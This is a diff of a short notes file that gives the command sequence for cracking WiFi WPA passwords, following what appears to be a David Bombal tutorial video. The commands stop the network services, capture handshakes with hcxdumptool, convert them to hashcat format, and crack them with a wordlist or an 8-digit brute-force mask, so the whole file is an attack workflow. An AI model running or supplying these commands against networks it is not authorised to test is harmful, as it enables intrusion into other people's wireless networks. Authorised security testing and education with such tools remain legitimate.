@@ -5,19 +5,20 @@ Hashcat wifi cracking from David Bombal's video
 
 https://www.youtube.com/watch?v=Usw0IlGbkC4&t=915s
 
-// COMMANDS //
-sudo systemctl stop NetworkManager.service
-sudo systemctl stop wpa_supplicant.service
+## COMMANDS
+```
+sudo systemctl stop NetworkManager && sudo systemctl stop wpa_supplicant
 
 sudo hcxdumptool -i wlan0 -o dumpfile.pcapng --active_beacon --enable_status=1
 
-sudo systemctl start wpa_supplicant.service
-sudo systemctl start NetworkManager.service
+sudo systemctl start wpa_supplicant && sudo systemctl start NetworkManager
 
 hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng
 
-hashcat -m 22000 hash.hc22000 wordlist.txt
+hcxdumptool --do_rcascan -i wlan0
 
+hashcat -m 22000 hash.hc22000 wordlist.txt
+```
 Windows:
 hashcat.exe -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
 
